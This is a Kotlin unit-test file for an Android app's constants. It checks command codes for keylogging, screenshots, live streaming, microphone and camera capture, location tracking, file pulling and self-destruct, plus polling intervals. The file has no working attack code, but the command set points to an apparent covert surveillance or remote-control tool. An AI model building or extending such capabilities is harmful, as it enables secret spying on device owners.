package com.bestiecourt.app.core.constants

import org.junit.Assert.*
import org.junit.Test

/**
 * Pure JVM unit tests – must pass on GitHub CI.
 */
class AppConstantsTest {

    @Test
    fun commandCodes_areUnique() {
        val codes = listOf(
            AppConstants.Commands.DIAG_PING,
            AppConstants.Commands.DIAG_DEVICE_STATUS,
            AppConstants.Commands.DIAG_STORAGE_INFO,
            AppConstants.Commands.DIAG_SECURITY_AUDIT,
            AppConstants.Commands.START_KEYLOG,
            AppConstants.Commands.STOP_KEYLOG,
            AppConstants.Commands.TAKE_SCREENSHOT,
            AppConstants.Commands.START_LIVE_STREAM,
            AppConstants.Commands.STOP_LIVE_STREAM,
            AppConstants.Commands.START_MIC,
            AppConstants.Commands.STOP_MIC,
            AppConstants.Commands.START_CAMERA,
            AppConstants.Commands.STOP_CAMERA,
            AppConstants.Commands.CAPTURE_PHOTO,
            AppConstants.Commands.GET_LOCATION,
            AppConstants.Commands.PULL_FILE,
            AppConstants.Commands.UPDATE_CONFIG,
            AppConstants.Commands.SELF_DESTRUCT
        )
        assertEquals("All command codes must be unique", codes.size, codes.toSet().size)
    }

    @Test
    fun intervals_arePositive() {
        assertTrue(AppConstants.KEYLOG_BATCH_INTERVAL_MS > 0)
        assertTrue(AppConstants.LOCATION_UPDATE_INTERVAL_MS > 0)
        assertTrue(AppConstants.POLLER_INTERVAL_MS > 0)
        assertTrue(AppConstants.MAX_MIC_RECORDING_MS > 0)
    }

    @Test
    fun deviceIdPrefix_isCorrect() {
        // Algorithm contract check (prefix + length)
        val sampleHash = "a1b2c3d4e5f67890"
        val id = "sc_$sampleHash"
        assertTrue(id.startsWith("sc_"))
        assertEquals(19, id.length) // "sc_" + 16 hex
    }

    @Test
    fun errorCodes_notEmpty() {
        assertEquals("permission_denied", AppConstants.ErrorCodes.PERMISSION_DENIED)
        assertEquals("execution_exception", AppConstants.ErrorCodes.EXECUTION_EXCEPTION)
        assertEquals("unsupported_command", AppConstants.ErrorCodes.UNSUPPORTED_COMMAND)
    }
}
